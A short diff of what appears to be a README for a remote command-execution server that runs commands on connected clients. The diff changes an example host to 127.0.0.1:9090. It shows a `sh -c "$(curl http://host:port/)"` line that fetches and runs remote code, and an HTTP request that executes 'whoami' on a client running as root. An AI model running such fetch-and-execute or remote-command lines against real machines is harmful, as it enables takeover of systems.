@@ -88,7 +88,7 @@ sh -c "$(curl http://host:port/)"
 ```
 * `POST /client/:hash` execute a command on a specific client
 ```
-# curl -X POST 'http://host:port/client/d14a421389af9436d7d4181774077dab' --data 'cmd=whoami'
+# curl -X POST 'http://127.0.0.1:9090/client/d14a421389af9436d7d4181774077dab' --data 'cmd=whoami'
 {
     "status": true,
     "msg": "root\n",
